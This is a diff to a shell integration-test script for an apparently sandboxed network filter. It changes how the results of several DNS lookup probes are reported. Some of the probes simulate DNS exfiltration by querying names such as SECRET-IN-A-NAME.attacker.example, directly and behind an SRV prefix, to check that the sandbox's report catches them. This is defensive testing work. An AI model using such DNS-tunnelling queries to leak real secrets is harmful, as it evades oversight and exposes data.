@@ -189,7 +189,7 @@ check_ok "GET tlspass.example.com:8443 (passthrough)" "$OUT" "PUBLIC GET"
 
 echo "=== [DNS-only exfiltration] ==="
 (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
-pass "queried (checked in the report, see integration-test-inspect-restrict.sh)"
+echo "  queried (checked in the report, see integration-test-inspect-restrict.sh)"
 
 # Nothing in the cage has a name, so the only question is how the lookup ends.
 # A query the resolver leaves unhandled is answered SERVFAIL, which musl reads
@@ -210,20 +210,20 @@ esac
 # to an exfiltration name must not be a way out of the report.
 echo "=== [Reverse zone, invented name] ==="
 (nslookup SECRET-IN-A-NAME.in-addr.arpa >/dev/null 2>&1 || true)
-pass "queried (checked in the report, see integration-test-inspect-restrict.sh)"
+echo "  queried (checked in the report, see integration-test-inspect-restrict.sh)"
 
 # apt asks for this on every repository it fetches from, and falls back to the
 # plain name when nothing comes back. The lookup works; reporting it as blocked
 # would fail a step that ran fine.
 echo "=== [Service discovery, host allowed] ==="
 (nslookup -type=SRV _http._tcp.allowed.example.com >/dev/null 2>&1 || true)
-pass "queried (checked in the report, see integration-test-inspect-restrict.sh)"
+echo "  queried (checked in the report, see integration-test-inspect-restrict.sh)"
 
 # Prefixing `_a._tcp.` must not be a way out of the report, so the verb above
 # is held to names under a host the rules allow.
 echo "=== [Service discovery, host not allowed] ==="
 (nslookup -type=SRV _mongodb._tcp.SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
-pass "queried (checked in the report, see integration-test-inspect-restrict.sh)"
+echo "  queried (checked in the report, see integration-test-inspect-restrict.sh)"
 
 echo "=== [Address in a URL rule] ==="
 OUT=$($S http://10.200.0.100/pub-by-addr/x)
